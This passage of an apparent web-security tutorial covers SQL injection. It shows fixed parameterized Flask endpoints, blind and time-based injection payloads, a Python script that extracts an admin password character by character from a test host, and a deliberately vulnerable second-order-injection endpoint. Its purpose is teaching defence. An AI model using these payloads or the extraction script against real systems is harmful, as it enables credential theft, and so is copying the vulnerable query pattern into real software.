<span class="w">    </span><span class="sd">&quot;&quot;&quot;FIXED: Parameterized query prevents injection.&quot;&quot;&quot;</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># Use parameter placeholders (?)</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="s2">&quot;SELECT * FROM users WHERE username = ? AND password_hash = ?&quot;</span><span class="p">,</span>
        <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
    <span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;logged in&quot;</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v2/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;FIXED: Parameterized search query.&quot;&quot;&quot;</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="s2">&quot;SELECT * FROM products WHERE name LIKE ?&quot;</span><span class="p">,</span>
        <span class="p">(</span><span class="sa">f</span><span class="s2">&quot;%</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">%&quot;</span><span class="p">,)</span>  <span class="c1"># Entire search term is a parameter</span>
    <span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">])</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v2/product/&lt;int:product_id&gt;&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">get_product_secure</span><span class="p">(</span><span class="n">product_id</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;FIXED: Whitelist for ORDER BY column.&quot;&quot;&quot;</span>
    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>

    <span class="c1"># Whitelist allowed sort columns</span>
    <span class="n">ALLOWED_SORT_COLUMNS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;price&#39;</span><span class="p">,</span> <span class="s1">&#39;created_at&#39;</span><span class="p">,</span> <span class="s1">&#39;rating&#39;</span><span class="p">}</span>
    <span class="k">if</span> <span class="n">sort</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ALLOWED_SORT_COLUMNS</span><span class="p">:</span>
        <span class="n">sort</span> <span class="o">=</span> <span class="s1">&#39;name&#39;</span>  <span class="c1"># Default to safe value</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># Column name can&#39;t be parameterized, so we use whitelist</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE id = ? ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">product_id</span><span class="p">,))</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>
</code></pre></div>

<h3 id="22-blind-sql-injection">2.2 Blind SQL Injection<a class="header-link" href="#22-blind-sql-injection" title="Permanent link">&para;</a></h3>
<p>When the application does not display query results or error messages, attackers use blind techniques to extract data one bit at a time.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="nt">Blind</span><span class="w"> </span><span class="nt">SQL</span><span class="w"> </span><span class="nt">Injection</span><span class="w"> </span><span class="nt">Types</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Boolean-Based</span><span class="w"> </span><span class="nt">Blind</span><span class="o">:</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">The</span><span class="w"> </span><span class="nt">application</span><span class="w"> </span><span class="nt">shows</span><span class="w"> </span><span class="nt">different</span><span class="w"> </span><span class="nt">behavior</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">TRUE</span><span class="w"> </span><span class="nt">vs</span><span class="w"> </span><span class="nt">FALSE</span><span class="w">      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="w"> </span><span class="nt">AND</span><span class="w"> </span><span class="nt">1</span><span class="o">=</span><span class="nt">1</span><span class="w">    </span><span class="err">â†’</span><span class="w"> </span><span class="nt">Normal</span><span class="w"> </span><span class="nt">page</span><span class="w"> </span><span class="o">(</span><span class="nt">TRUE</span><span class="o">)</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="w"> </span><span class="nt">AND</span><span class="w"> </span><span class="nt">1</span><span class="o">=</span><span class="nt">2</span><span class="w">    </span><span class="err">â†’</span><span class="w"> </span><span class="nt">Different</span><span class="w"> </span><span class="nt">page</span><span class="w"> </span><span class="o">(</span><span class="nt">FALSE</span><span class="o">)</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Extract</span><span class="w"> </span><span class="nt">data</span><span class="w"> </span><span class="nt">character</span><span class="w"> </span><span class="nt">by</span><span class="w"> </span><span class="nt">character</span><span class="o">:</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="w"> </span><span class="nt">AND</span><span class="w"> </span><span class="nt">SUBSTRING</span><span class="o">(</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="o">(</span><span class="nt">SELECT</span><span class="w"> </span><span class="nt">password</span><span class="w"> </span><span class="nt">FROM</span><span class="w"> </span><span class="nt">users</span><span class="w"> </span><span class="nt">WHERE</span><span class="w"> </span><span class="nt">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="o">),</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">          </span><span class="err">â†’</span><span class="w"> </span><span class="nt">TRUE</span><span class="o">/</span><span class="nt">FALSE</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">each</span><span class="w"> </span><span class="nt">character</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Time-Based</span><span class="w"> </span><span class="nt">Blind</span><span class="o">:</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">The</span><span class="w"> </span><span class="nt">application</span><span class="w"> </span><span class="nt">response</span><span class="w"> </span><span class="nt">time</span><span class="w"> </span><span class="nt">reveals</span><span class="w"> </span><span class="nt">TRUE</span><span class="o">/</span><span class="nt">FALSE</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">IF</span><span class="o">(</span><span class="nt">1</span><span class="o">=</span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">),</span><span class="w"> </span><span class="nt">0</span><span class="o">)</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="nt">5</span><span class="w"> </span><span class="nt">second</span><span class="w"> </span><span class="nt">delay</span><span class="w"> </span><span class="o">(</span><span class="nt">TRUE</span><span class="o">)</span><span class="w">    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">IF</span><span class="o">(</span><span class="nt">1</span><span class="o">=</span><span class="nt">2</span><span class="o">,</span><span class="w"> </span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">),</span><span class="w"> </span><span class="nt">0</span><span class="o">)</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="nt">Instant</span><span class="w"> </span><span class="nt">response</span><span class="w"> </span><span class="o">(</span><span class="nt">FALSE</span><span class="o">)</span><span class="w"> </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Extract</span><span class="w"> </span><span class="nt">data</span><span class="o">:</span><span class="w">                                                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">IF</span><span class="o">(</span><span class="nt">SUBSTRING</span><span class="o">(</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="o">(</span><span class="nt">SELECT</span><span class="w"> </span><span class="nt">password</span><span class="w"> </span><span class="nt">FROM</span><span class="w"> </span><span class="nt">users</span><span class="w"> </span><span class="nt">LIMIT</span><span class="w"> </span><span class="nt">1</span><span class="o">),</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">,</span><span class="w">                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">),</span><span class="w"> </span><span class="nt">0</span><span class="o">)</span><span class="w">          </span><span class="err">â†’</span><span class="w"> </span><span class="nt">Delay</span><span class="w"> </span><span class="nt">if</span><span class="w"> </span><span class="nt">first</span><span class="w"> </span><span class="nt">char</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">blind_sqli_demo.py - Demonstrating how blind SQL injection works</span>
<span class="sd">FOR EDUCATIONAL PURPOSES ONLY</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">string</span><span class="w"> </span><span class="kn">import</span> <span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">digits</span>

<span class="c1"># This simulates what an attacker&#39;s script looks like</span>
<span class="c1"># DO NOT use against systems you don&#39;t own</span>

<span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&quot;http://vulnerable-app.local/user&quot;</span>
<span class="n">CHARSET</span> <span class="o">=</span> <span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">digits</span> <span class="o">+</span> <span class="s2">&quot;!@#$%&quot;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">boolean_blind_extract</span><span class="p">(</span><span class="n">query_template</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">max_length</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">32</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Extract data using boolean-based blind SQL injection.</span>
<span class="sd">    query_template should have {pos} and {char} placeholders.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">query_template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>

            <span class="k">if</span> <span class="s2">&quot;Welcome&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>  <span class="c1"># TRUE condition</span>
                <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; (extracted so far: &#39;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
                <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>  <span class="c1"># End of string</span>

    <span class="k">return</span> <span class="n">result</span>


<span class="k">def</span><span class="w"> </span><span class="nf">time_blind_extract</span><span class="p">(</span><span class="n">query_template</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">max_length</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">32</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Extract data using time-based blind SQL injection.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">query_template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
            <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>

            <span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>  <span class="c1"># Delay detected = TRUE</span>
                <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; (elapsed: </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2">s)&quot;</span><span class="p">)</span>
                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
                <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">result</span>


<span class="c1"># Example: Extract admin password with boolean-based blind</span>
<span class="c1"># admin_password = boolean_blind_extract(</span>
<span class="c1">#     &quot;1 AND SUBSTRING((SELECT password FROM users WHERE username=&#39;admin&#39;),{pos},1)=&#39;{char}&#39;&quot;</span>
<span class="c1"># )</span>
</code></pre></div>

<h3 id="23-second-order-sql-injection">2.3 Second-Order SQL Injection<a class="header-link" href="#23-second-order-sql-injection" title="Permanent link">&para;</a></h3>
<p>Second-order SQL injection occurs when user input is stored in the database and later used unsafely in a different query.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="k">Second</span><span class="o">-</span><span class="k">Order</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">Injection</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="err">:</span><span class="w"> </span><span class="n">Attacker</span><span class="w"> </span><span class="n">registers</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">username</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="nl">Username</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="s1">&#39;--                  â”‚                         â”‚</span>
<span class="s1">â”‚  â”‚ Password: anything                  â”‚                         â”‚</span>
<span class="s1">â”‚  â”‚ [Register]                          â”‚                         â”‚</span>
<span class="s1">â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚</span>
<span class="s1">â”‚  â†’ Username &quot;admin&#39;</span><span class="c1">--&quot; safely stored using parameterized query   â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="err">:</span><span class="w"> </span><span class="n">Attacker</span><span class="w"> </span><span class="n">triggers</span><span class="w"> </span><span class="ss">&quot;change password&quot;</span><span class="w"> </span><span class="n">flow</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Server</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="n">retrieves</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">database</span><span class="err">:</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_current_user</span><span class="p">().</span><span class="n">username</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="ss">&quot;admin&#39;--&quot;</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Server</span><span class="w"> </span><span class="n">uses</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">another</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="p">(</span><span class="n">unsafely</span><span class="p">)</span><span class="err">:</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;new_hash&#39;</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39;                                   â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="k">Result</span><span class="err">:</span><span class="w"> </span><span class="n">Changed</span><span class="w"> </span><span class="k">ADMIN</span><span class="s1">&#39;s password, not their own!               â”‚</span>
<span class="s1">â”‚                                                                  â”‚</span>
<span class="s1">â”‚  The first query was safe. The second wasn&#39;</span><span class="n">t</span><span class="p">.</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nl">Defense</span><span class="p">:</span><span class="w"> </span><span class="n">Parameterize</span><span class="w"> </span><span class="ow">ALL</span><span class="w"> </span><span class="n">queries</span><span class="p">,</span><span class="w"> </span><span class="n">even</span><span class="w"> </span><span class="n">those</span><span class="w"> </span><span class="k">using</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="k">data</span><span class="w"> </span><span class="n">retrieved</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">own</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="w">                          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="c1"># VULNERABLE: Second-order SQL injection</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/change-password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">change_password_vulnerable</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">get_current_user</span><span class="p">()</span>  <span class="c1"># Retrieved from DB</span>
    <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;new_password&#39;</span><span class="p">]</span>
    <span class="n">new_hash</span> <span class="o">=</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">new_password</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># VULNERABLE: username from DB used without parameterization!</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;UPDATE users SET password_hash = &#39;</span><span class="si">{</span><span class="n">new_hash</span><span class="si">}</span><span class="s2">&#39; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;WHERE username = &#39;</span><span class="si">{</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span>  <span class="c1"># user.username = &quot;admin&#39;--&quot;</span>
    <span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;updated&quot;</span><span class="p">})</span>


